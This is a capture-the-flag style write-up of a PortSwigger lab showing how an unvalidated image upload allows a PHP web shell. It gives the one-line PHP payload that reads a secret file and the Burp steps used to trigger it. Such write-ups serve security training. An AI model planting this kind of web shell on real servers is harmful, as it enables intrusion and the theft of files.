---
layout: post
title: "Lab: Remote code execution via web shell upload [Write-up]"
date: 2026-07-30
platform: portswigger
vulntype: file_uploads_vuln
difficulty: Easy
category: write-up
tags: [web]
---

## Overview

**Lab:** Remote code execution via web shell upload

**Platform:** PortSwigger

**Difficulty:** Easy

---

## Description

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

**What are file upload vulnerabilities?**

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.

---

Our task is to read the “secret” file. To do this, we need to exploit a file upload vulnerability to upload a malicious file to the server, which we can then use to read that file.

The first step is to log in to our account 

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod1.png" alt="file_uploads_vuln" />
</p>

On the profile page, we can see that we can upload an image for the profile icon

The next step will be to create a malicious file 

```python
nano exploit.php
```

```python
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

> Note: I also used another piece of malicious code where I had to add ?cmd= to the query afterward. I was able to read the file, but the code didn't work for the response.

We send this file and intercept the request 

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod2.png" alt="file_uploads_vuln" />
</p>

After that, we'll receive this request, which we'll send to the repeater 

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod3.png" alt="file_uploads_vuln" />
</p>

If we send this request, the response should contain the contents of the secret file. 

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod4.png" alt="file_uploads_vuln" />
</p>

---
<div align="center">

This post is licensed under  
<a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>.

© 2026 CyberKRY

</div>
